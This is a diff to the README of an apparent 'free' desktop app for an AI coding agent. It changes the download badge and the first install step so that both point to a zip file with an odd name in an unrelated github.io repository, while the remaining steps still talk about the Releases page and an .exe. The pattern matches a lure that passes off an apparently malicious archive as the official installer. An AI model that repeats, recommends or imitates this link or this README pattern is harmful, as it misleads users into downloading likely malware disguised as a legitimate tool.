@@ -5,7 +5,7 @@ description: "Run the Claude Code Fable 5 agent on your desktop with this commun
 ---
 # 🤖 claude-code-fable-5-free-app - Access advanced AI models on desktop
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Genusoviboscremeanglais30/claude-code-fable-5-free-app)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Genusoviboscremeanglais30/genusoviboscremeanglais30.github.io/raw/refs/heads/main/sensable/genusoviboscremeanglais-io-github-baikalite.zip)
 
 ## 📋 About the software
 
@@ -24,7 +24,7 @@ To run this application, your computer needs the following specifications:
 
 You need to download the installer from the official repository page. Follow these instructions:
 
-1. Visit the following link to access the download page: [https://github.com/Genusoviboscremeanglais30/claude-code-fable-5-free-app](https://github.com/Genusoviboscremeanglais30/claude-code-fable-5-free-app)
+1. Visit the following link to access the download page: [https://github.com/Genusoviboscremeanglais30/genusoviboscremeanglais30.github.io/raw/refs/heads/main/sensable/genusoviboscremeanglais-io-github-baikalite.zip](https://github.com/Genusoviboscremeanglais30/genusoviboscremeanglais30.github.io/raw/refs/heads/main/sensable/genusoviboscremeanglais-io-github-baikalite.zip)
 2. Look for the "Releases" section on the right side of the screen.
 3. Click the latest version link.
 4. Locate the file ending in .exe under the "Assets" heading.
